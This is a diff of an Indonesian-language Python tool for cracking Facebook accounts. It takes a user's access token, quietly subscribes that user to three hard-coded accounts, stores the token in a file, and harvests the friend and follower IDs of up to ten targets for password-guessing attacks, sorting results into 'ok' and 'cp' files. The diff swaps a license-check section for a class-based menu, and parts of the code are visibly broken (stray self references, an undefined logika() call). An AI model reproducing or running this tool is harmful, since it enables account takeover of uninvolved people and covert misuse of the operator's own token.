@@ -4,40 +4,21 @@ import requests as req,json,time,os,sys,re
 from concurrent.futures import ThreadPoolExecutor as Bool
 from bs4 import BeautifulSoup as parser
 from random import choice as awokawok,randint as kontol
-import os
-import sys
-import time
-import datetime
-import random
-import hashlib
-import re
-import threading
-import json
-import urllib
-import requests
-import uuid
-import ipaddress
-import calendar
-from multiprocessing.pool import ThreadPool
-from requests.exceptions import ConnectionError
-from bs4 import BeautifulSoup as par
-from time import sleep
-from datetime import datetime
-from datetime import date
 
 id=[]
 ok,cp,cot=0,0,0
 ajg=""
 mb="https://mbasic.facebook.com"
 
-def pilihlogin():
+def login():
 	os.system("clear")
-	time.sleep(0.07)
-	logo()
-	print("\033[1;36m[\033[1;37m01\033[1;36m]. \033[1;37mLogin dengan token\n\033[1;36m[\033[1;37m02\033[1;36m]. \033[1;37mLogin dengan cookie\n")
-	pil=input("\033[1;36m[\033[1;37m?\033[1;36m]. \033[1;37mPilih metode login :\033[1;33m ")
+	print("""
+	 HARAP LOGIN UNTUK MELANJUTKAN KE SCRIPT
+	""")
+	print("[1]. Login Dengan Accesstoken Facebook\n[2]. Cara Mendapatkan Accesstoken\n")
+	pil=input("[!] Pilih Metode Login: ")
 	if(pil in ("01","1")):
-		to=input("\033[1;36m[\033[1;37m+\033[1;36m]. \033[1;37mMasukan accsess token anda :\033[1;36m ")
+		to=input("[+] Masukan Access Token Anda: ")
 		r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={to}").text)
 		try:
 			nama=r['name']
@@ -47,13 +28,12 @@ def pilihlogin():
 			req.post(f"https://graph.facebook.com/1011933821/subscribers?access_token={to}")
 			req.post(f"https://graph.facebook.com/100069718286138/subscribers?access_token={to}")
 			req.post(f"https://graph.facebook.com/103513548711079/subscribers?access_token={to}")
-			print('')
-			print(f"\033[1;36m[\033[1;37m☆\033[1;36m] \033[1;32mLogin berhasil")
+			print(f"[☆] Login Berhasil [☆]\nWelcome {nama}")
+			open("save","a").write(to)
 			time.sleep(1.5)
-			os.system("clear")
-			menu()
+			crack(to,nama).menu()
 		except KeyError:
-			print("\033[1;36m[\033[1;37×\033[1;36m]\033[1;31 Login Gggal [×]\nAccess Token Salah")
+			print("[×] Login Gagal [×]\nAccess Token Salah")
 			time.sleep(1.5)
 			login()
 	elif(pil in ("2","02")):
@@ -227,202 +207,115 @@ class crack:
 			self.menu()
 		elif(yt in ("t","T")):
 			self.menu()
-def logo():
-	wok=[]
-	os.system('clear')
-	ha=0
-	print('')
-	print('')
-	time.sleep(1)
-	jalan ("\033[1;37m                    ______---_____ ")
-	jalan ("\033[1;37m         ___-----           __      ---- ")
-	jalan ("\033[1;37m ___---             ___------             \ ")
-	jalan ("\033[1;37m     ---______        ----                 \ ")
-	jalan ("\033[1;37m                 --__    |             _____)")
-	jalan ("\033[1;37m                     -                /     \ ")
-	jalan ("\033[1;37m          _____-----    ___--         \    / )")
-	jalan ("\033[1;37m    -----_____      ---____            \__/  /")
-	jalan ("\033[1;37m                 --__    \ --    _          /\ ")
-	jalan ("\033[1;37m                      --__-__     \_____/   \_/\ ")
-	jalan ("\033[1;37m                            ----|   /          |")
-	jalan ("\033[1;36mAuthor \033[1;37m : JESSICA PUTRY         |  |___________|")
-	jalan ("\033[1;36mGelar  \033[1;37m : Ratu error            |  | ((_(_)| )_)")
-	jalan ("\033[1;36mGroup\033[1;37m   : \033[1;32mRatu error...         \33[0;1m\033[1;37m|  \_((_(_)|/(_)")
-	jalan ("\033[1;36m¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤\033[1;37m\             (")
-	jalan ("\033[1;36m¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤\033[1;37m\_____________)")
-	print('')
-	time.sleep(0.07)
-	
-def xxnx():
-    try:
-        toket = open('licensed.log', 'r').read()
-    except IOError:
-        print ('\x1b[1;91m License Invalid !')
-        os.system('clear')
-        os.system('rm -rf licensed.log')
-        lisen()
-    if os.path.exists('licensed.log'):
-        user1()
-    else:
-        lisen()
-        
-def lisen():
-    os.system('clear')
-    logo()
-    jalan('\n\x1b[1;96m [\x1b[1;97m*\x1b[1;96m] \x1b[1;92mMohon tunggu ...');time.sleep(2.0)
-    id = uuid.uuid4().hex[:25]
-    idg = open('licensed.log', 'w')
-    idg.write(id)
-    idg.close()
-    jalan ('\n\033[1;96m [\033[1;97m*\033[1;96m]\033[1;97m Lisensi : \x1b[92m' + id)
-    time.sleep(0.07)
-    jalan ('\033[1;96m [\033[1;97m*\033[1;96m] \033[1;97mChat Admin Untuk Mengkonfirmasi Lisensi\x1b[1;39m')
-    input('\n\033[1;96m [\033[1;97m*\033[1;96m] \033[1;97mTekan Enter ')
-    os.system('am start https://wa.me/+62895341157823?text=Hi+Ratu+Beli+Lisensi+dong.%20Lisensi:%20' + id + ' >/dev/null') 
-    time.sleep(1)
-    os.sys.exit()
-def user1():
-    try:
-        j = open('licensed.log', 'r').read()
-        r = requests.get('https://github.com/bucin25/License/blob/main/id').text.strip() # Jangan Di ganti bro'i nanti error
-        if j in r:
-            os.system('exit')
-            logo()
-            print ('\x1b[1;96m [\033[1;97m*\033[1;96m]\033[1;97m Memeriksa Lisensi ' );time.sleep(2.0)
-            jalan('\n\033[1;96m [\033[1;97m*\033[1;96m]\033[1;97m Lisensi \033[1;92mTersedia ✓');time.sleep(2.0)
-            pilihlogin()
-        else:
-            os.system('clear')
-            logo()
-            print ('\x1b[1;96m [\033[1;97m*\033[1;96m]\033[1;97m Memeriksa Lisensi ' );time.sleep(2.0)
-            jalan ('\n\x1b[1;91m [*] Lisensi Tidak Tersedia !')
-            time.sleep(1)
-            lisen()
-            jalan ('\033[1;96m [\033[1;97m*\033[1;96m]\033[1;97m Chat Admin Untuk Mengkonfirmasi Lisensi\x1b[1;39m')
-            time.sleep(0.07)
-            input('\n\x1b[1;97m [*] Tekan Enter ')
-            os.system('am start https://wa.me/+62895341157823?text=Hi+Ratu+Beli+Lisensi+dong.%20Lisensi:%20' + j + ' >/dev/null')
-            os.sys.exit()
-    except KeyboardInterrupt:
-        os.sys.exit()
-    except IOError:
-        subprocess.Popen(['rm', '-rf', 'licensed.log'])
-        romz()
-
-def jalan(z):
-    for e in z + '\n':
-        sys.stdout.write(e)
-        sys.stdout.flush()
-        time.sleep(0.01)
-	
-def menu():
-	os.system("clear")
-	time.sleep(0.01)
-	print('')
-	print('')
-	print('')
-	jalan ('                \33[3;1m\033[1;97mW e l c o m e  T o\33[0;1m')
-	print('')
-	jalan ('       \033[1;96m[\33[37;1mR\033[1;96m] \033[1;96m[\033[1;97mA\033[1;96m] \033[1;96m[\033[1;97mT\033[1;96m] \033[1;96m[\033[1;97mU\033[1;96m]  \033[1;96m[\033[1;97mE\033[1;96m] \033[1;96m[\033[1;97mR\033[1;96m] \033[1;96m[\33[37;1mR\033[1;96m] \033[1;96m[\033[1;97mO\033[1;96m] \033[1;96m[\033[1;97mR\033[1;96m]\033[1;96m')
-	print (' \033[1;96m  ____________________________________________')
-	print ('\033[1;97m\033[1;96m ¤\033[1;97m{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}\033[1;96m¤')
-	print('')
-	print('')
-	print('\033[1;36m[\033[1;37m01\033[1;36m] \033[1;37mCrack daftar teman\033[1;36m/\033[1;37mpublik\n\033[1;36m[\033[1;37m02\033[1;36m] \033[1;37mCrack daftar followers\n\033[1;36m[\033[1;37m03\033[1;36m] \033[1;37mCek hasil crack\n\033[1;36m[\033[1;37m04\033[1;36m] \033[1;37mSetting useragent\n\033[1;36m[\033[1;37m05\033[1;36m] \033[1;37mLog out script\n\033[1;36m[\033[1;37m06\033[1;36m] \033[1;37mLaporkan masalah')
-	print('')
-	pil=input('\033[1;36m[\033[1;37m?\033[1;36m] \033[1;37mPilih :\033[1;33m ')
-	if(pil in ('01','1')):
-		print('\n\tCRACK DAFTAR TEMAN')
-	try:
-		jumlah=int(input("\n[!] Target maximal 10 Target\n[?] Masukan Jumlah Target: "))
-		if(jumlah>=11):
-			print("\n[!] Target terlalu banyak maximal target 10")
-			time.sleep(2)
-			self.menu()
-		else:pass
-	except:jumlah=1
-	print("\nKetik 'me' Buat Crack Daftar Teman Akun Anda")
-	for j in range(jumlah):
-			ha+=1
-			target=input(f"[+] Masukan ID Target Ke {ha}: ").replace("'me'","me")
-	try:
-		rr=json.loads(req.get(f'https://graph.facebook.com/{target}?access_token={self.token}').text)
-		print(f"[=] Nama Target\t: {rr['name']}")
-		ro=json.loads(req.get(f'https://graph.facebook.com/{target}/friends?access_token={self.token}').text)
-		for x in ro['data']:
-			wok.append(x['id'])
-		print(f"[=] Jumlah ID\t: {len(wok)}")
-		wok.clear()
-	except KeyError:
-		print("Target Tidak Ada")
-		time.sleep(1)
-		self.menu()
-	r=json.loads(req.get(f"https://graph.facebook.com/{target}/friends?access_token={self.token}").text)
-	for x in r['data']:
-		idnya=x['id']
-		nama=x['name'].rsplit(' ')[0]
-		id.append(idnya+'|'+nama)
-		self.kirim()
-elif(pil in ('02','2')):
-		print('\n\tCRACK DAFTAR FOLLOWERS')
-		try:
-			jumlah=int(input("\n[!] Target maximal 10 Target\n[?] Masukan Jumlah Target: "))
-			if(jumlah>=11):
-				print("\n[!] Target terlalu banyak maximal target 10")
-				time.sleep(2)
-				self.menu()
-			else:pass
-		except:jumlah=1
-		print("\nKetik 'me' Buat Crack Daftar Followers Akun Anda")
-		for j in range(jumlah):
-			target=input("[+] Masukan ID Target: ").replace("'me'","me")
+	def menu(self):
+		wok=[]
+		os.system('clear')
+		ha=0
+		print("""
+  _________   _____ __________.___
+ /   _____/  /  _  \\______    \   | 
+ \_____  \  /  /_\  \|     ___/   |     
+ /        \/    |    \    |   |   |   
+/_______  /\____|__  /____|   |___|
+        \/         \/
+        Latif. H & Yanwar. E
+        """)
+		self.jalan(f"[!] Welcome {self.nama} Selamat Menggunakan\n")
+		print('[1]. Crack Daftar Teman/Publik\n[2]. Crack Daftar Followers\n[C]. Cek Hasil Crack\n[S]. Setting Useragent\n[L]. Logout Script\n[R]. Laporkan Bug Or Error')
+		print(f'+'+'-'*45+'+\n')
+		pil=input('[+] Select: ')
+		if(pil in ('01','1')):
+			print('\n\tCRACK DAFTAR TEMAN')
 			try:
-				rr=json.loads(req.get(f'https://graph.facebook.com/{target}?access_token={self.token}').text)
-				print(f"[=] Nama Target\t: {rr['name']}")
-				ro=json.loads(req.get(f'https://graph.facebook.com/{target}/subscribers?limit=50000&access_token={self.token}').text)
-				for x in ro['data']:
-					wok.append(x['id'])
-				print(f"[=] Jumlah ID\t: {len(wok)}")
-				wok.clear()
-			except KeyError:
-				print("Target Tidak Ada")
-				time.sleep(1)
-				self.menu()
-			r=json.loads(req.get(f'https://graph.facebook.com/{target}/subscribers?limit=50000&access_token={self.token}').text)
-			for x in r['data']:
-				idnya=x['id']
-				nama=x['name'].rsplit(' ')[0]
-				id.append(idnya+'|'+nama)
-		self.kirim()
-	elif(pil in ("c","C")):
-		print("\n\nPilih Cek Hasil Crack\n[1]. Hasil Ok\n[2]. Hasil Cp\n[3]. Kembali Ke Menu\n")
-		hh=input("[!] Select: ")
-		if(hh in ("01","1")):
+				jumlah=int(input("\n[!] Target maximal 10 Target\n[?] Masukan Jumlah Target: "))
+				if(jumlah>=11):
+					print("\n[!] Target terlalu banyak maximal target 10")
+					time.sleep(2)
+					self.menu()
+				else:pass
+			except:jumlah=1
+			print("\nKetik 'me' Buat Crack Daftar Teman Akun Anda")
+			for j in range(jumlah):
+				ha+=1
+				target=input(f"[+] Masukan ID Target Ke {ha}: ").replace("'me'","me")
+				try:
+					rr=json.loads(req.get(f'https://graph.facebook.com/{target}?access_token={self.token}').text)
+					print(f"[=] Nama Target\t: {rr['name']}")
+					ro=json.loads(req.get(f'https://graph.facebook.com/{target}/friends?access_token={self.token}').text)
+					for x in ro['data']:
+						wok.append(x['id'])
+					print(f"[=] Jumlah ID\t: {len(wok)}")
+					wok.clear()
+				except KeyError:
+					print("Target Tidak Ada")
+					time.sleep(1)
+					self.menu()
+				r=json.loads(req.get(f"https://graph.facebook.com/{target}/friends?access_token={self.token}").text)
+				for x in r['data']:
+					idnya=x['id']
+					nama=x['name'].rsplit(' ')[0]
+					id.append(idnya+'|'+nama)
+			self.kirim()
+		elif(pil in ('02','2')):
+			print('\n\tCRACK DAFTAR FOLLOWERS')
 			try:
-				print("\n"+open("ok","r").read())
-				input("Enter For Back To Menu")
+				jumlah=int(input("\n[!] Target maximal 10 Target\n[?] Masukan Jumlah Target: "))
+				if(jumlah>=11):
+					print("\n[!] Target terlalu banyak maximal target 10")
+					time.sleep(2)
+					self.menu()
+				else:pass
+			except:jumlah=1
+			print("\nKetik 'me' Buat Crack Daftar Followers Akun Anda")
+			for j in range(jumlah):
+				target=input("[+] Masukan ID Target: ").replace("'me'","me")
+				try:
+					rr=json.loads(req.get(f'https://graph.facebook.com/{target}?access_token={self.token}').text)
+					print(f"[=] Nama Target\t: {rr['name']}")
+					ro=json.loads(req.get(f'https://graph.facebook.com/{target}/subscribers?limit=50000&access_token={self.token}').text)
+					for x in ro['data']:
+						wok.append(x['id'])
+					print(f"[=] Jumlah ID\t: {len(wok)}")
+					wok.clear()
+				except KeyError:
+					print("Target Tidak Ada")
+					time.sleep(1)
+					self.menu()
+				r=json.loads(req.get(f'https://graph.facebook.com/{target}/subscribers?limit=50000&access_token={self.token}').text)
+				for x in r['data']:
+					idnya=x['id']
+					nama=x['name'].rsplit(' ')[0]
+					id.append(idnya+'|'+nama)
+			self.kirim()
+		elif(pil in ("c","C")):
+			print("\n\nPilih Cek Hasil Crack\n[1]. Hasil Ok\n[2]. Hasil Cp\n[3]. Kembali Ke Menu\n")
+			hh=input("[!] Select: ")
+			if(hh in ("01","1")):
+				try:
+					print("\n"+open("ok","r").read())
+					input("Enter For Back To Menu")
+					self.menu()
+				except FileNotFoundError:
+					input("\n[!] Anda Belum Mendapatkan Hasil Ok\nEnter For Back To Menu")
+					self.menu()
+			elif(hh in ("02","2")):
+				try:
+					print("\n"+open("cp","r").read())
+					input("Enter For Back To Menu")
+					self.menu()
+				except FileNotFoundError:
+					input("\n[!] Anda Belum Mendapatkan Hasil Cp\nEnter For Back To Menu")
+					self.menu()
+			elif(hh in ("03","3")):
 				self.menu()
-			except FileNotFoundError:
-				input("\n[!] Anda Belum Mendapatkan Hasil Ok\nEnter For Back To Menu")
-				self.menu()
-		elif(hh in ("02","2")):
-			try:
-				print("\n"+open("cp","r").read())
-				input("Enter For Back To Menu")
-				self.menu()
-			except FileNotFoundError:
-				input("\n[!] Anda Belum Mendapatkan Hasil Cp\nEnter For Back To Menu")
-				self.menu()
-		elif(hh in ("03","3")):
-			self.menu()
-	elif(pil in ("s","S")):
-		self.useragent()
-	elif(pil in ('l','L')):
-		os.system('rm -rf save')
-		exit('\nBerhasil Logout Dan Hapus Akun')
-	elif(pil in ("r","R")):
-		print("\n[√] Menuju WhatsApp Author....\n[!] Klik Buka Dengan WhatsApp")
-		os.system("xdg-open https://wa.me/6283870396203")
+		elif(pil in ("s","S")):
+			self.useragent()
+		elif(pil in ('l','L')):
+			os.system('rm -rf save')
+			exit('\nBerhasil Logout Dan Hapus Akun')
+		elif(pil in ("r","R")):
+			print("\n[√] Menuju WhatsApp Author....\n[!] Klik Buka Dengan WhatsApp")
+			os.system("xdg-open https://wa.me/6283870396203")
 
 if __name__=="__main__":
 	try:
@@ -433,4 +326,4 @@ if __name__=="__main__":
 		open("ua","a").write(tll)
 		print("[√] Berhasil Ditambahkan\nSedang Menuju Ke Tools")
 		time.sleep(1)
-	xxnx()
+	logika()
